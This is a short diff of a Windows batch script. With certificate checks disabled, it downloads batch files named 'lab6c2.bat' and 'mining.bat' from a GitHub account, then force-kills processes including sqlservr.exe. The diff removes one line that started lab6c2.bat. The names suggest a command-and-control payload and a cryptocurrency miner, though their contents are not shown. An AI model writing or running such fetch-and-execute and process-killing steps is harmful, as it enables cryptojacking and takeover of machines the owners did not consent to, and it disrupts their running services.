@@ -17,7 +17,6 @@ curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/lab6c2.bat
 curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/mining.bat
 cls
 @echo off
-start lab6c2.bat
 net start audiosrv
 taskkill /f /im sqlservr.exe
 taskkill /f /im Batch.exe
